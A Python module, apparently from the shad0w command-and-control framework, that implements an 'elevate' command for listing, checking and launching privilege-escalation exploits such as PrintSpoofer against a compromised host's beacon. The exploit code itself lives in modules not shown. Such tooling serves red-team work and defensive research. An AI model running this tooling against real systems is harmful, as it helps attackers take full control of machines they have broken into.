#
# Elevate the current users privs
#

import os
import sys
import argparse
import importlib
import threading

from prettytable import PrettyTable

__description__ = "Attempt to elevate the beacons privilages on the target"
__author__ = "@_batsec_"

ERROR = False
error_list = ""
RAN_COMMAND = False

# beacon to exec command on
current_beacon = None

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None):
    if message != None: print(message)
    return

def list_exploits(shad0w):
    sys.path.append("/root/shad0w/exploits/")
    all_exploits = importlib.import_module("__init__").__all__

    shad0w.event.beacon_info(current_beacon, f"{len(all_exploits)} avalible exploits:\n")
    t = PrettyTable(['Exploit', 'Description'])

    for exploit in all_exploits:
        exploit_name = os.path.basename(exploit)
        description = importlib.import_module(exploit.replace("/", ".")).__description__["Details"]
        t.add_row([exploit_name, description])

    shad0w.event.beacon_info(current_beacon, str(t))

def show_details(shad0w, name):
    sys.path.append("/root/shad0w/exploits/")
    all_exploits = importlib.import_module("__init__").__all__

    for exploit in all_exploits:
        exploit_name = os.path.basename(exploit)
        if name == exploit_name:
            author = importlib.import_module(exploit.replace("/", ".")).__description__["Author"]
            cve = importlib.import_module(exploit.replace("/", ".")).__description__["CVE"]
            target = importlib.import_module(exploit.replace("/", ".")).__description__["Target"]
            versions = importlib.import_module(exploit.replace("/", ".")).__description__["Versions"]
            arch = importlib.import_module(exploit.replace("/", ".")).__description__["Arch"]

            secure = importlib.import_module(exploit.replace("/", ".")).__description__["Secure"]
            if secure: secure = "Yes"
            else: secure = "No"

            shad0w.event.beacon_info(current_beacon, "Exploit details:\n")
            shad0w.event.beacon_info(current_beacon, f"Name: {exploit_name}")
            shad0w.event.beacon_info(current_beacon, f"Author: {author}")
            shad0w.event.beacon_info(current_beacon, f"CVE: {cve}")
            shad0w.event.beacon_info(current_beacon, f"Target: {target}")
            shad0w.event.beacon_info(current_beacon, f"Versions: {versions}")
            shad0w.event.beacon_info(current_beacon, f"Arch: {arch}")
            shad0w.event.beacon_info(current_beacon, f"Supports Secure: {secure}")

def check_exploit(shad0w, name, arch):
    # run the exploit in check mode

    sys.path.append("/root/shad0w/exploits/")
    all_exploits = importlib.import_module("__init__").__all__

    for exploit in all_exploits:
        exploit_name = os.path.basename(exploit)
        if name == exploit_name:
            importlib.import_module(exploit.replace("/", ".")).check(shad0w, arch, current_beacon)

def use_exploit(shad0w, name, arch):
    # run the exploit in exploit mode

    sys.path.append("/root/shad0w/exploits/")
    all_exploits = importlib.import_module("__init__").__all__

    for exploit in all_exploits:
        exploit_name = os.path.basename(exploit)
        if name == exploit_name:
            exploit_mod = importlib.import_module(exploit.replace("/", "."))
            threading.Thread(target=exploit_mod.exploit, args=(shad0w, arch, current_beacon)).start()

def main(shad0w, args, beacon):
    global RAN_COMMAND, current_beacon

    # make beacon global
    current_beacon = beacon

    # usage examples
    usage_examples = """

Examples:

elevate --list
elevate --details system_printspoofer
elevate --check system_printspoofer
elevate --use system_printspoofer
elevate --smart
"""

    # init the parser
    parse = argparse.ArgumentParser(prog='elevate',
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("-l", "--list", required=False, action='store_true', help="List the exploits avalible for the current session")
    parse.add_argument("-d", "--details", required=False, help="Display the details of an exploit")
    parse.add_argument("-c", "--check", required=False, help="Check if the exploit will work")
    parse.add_argument("-u", "--use", required=False, help="Use the exploit to attempt to elevate the session")
    parse.add_argument("-s", "--smart", required=False, action='store_true', help="Attempt to auto elevate by letting shad0w decide what exploits to use")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # we need a file to read so if we dont then fail
    if ERROR:
        print(error_list)
        parse.print_help()
        return

    # list the avalible exploits
    if args.list:
        RAN_COMMAND = True
        list_exploits(shad0w)

    # show the details for an exploit
    if args.details:
        RAN_COMMAND = True
        show_details(shad0w, args.details)

    # check if an exploit will work
    if args.check:
        RAN_COMMAND = True
        session_arch = shad0w.beacons[current_beacon]["arch"]
        check_exploit(shad0w, args.check, session_arch)

    # check if an exploit will work
    if args.use:
        RAN_COMMAND = True
        session_arch = shad0w.beacons[current_beacon]["arch"]
        use_exploit(shad0w, args.use, session_arch)

    if RAN_COMMAND == False:
        parse.print_help()
        return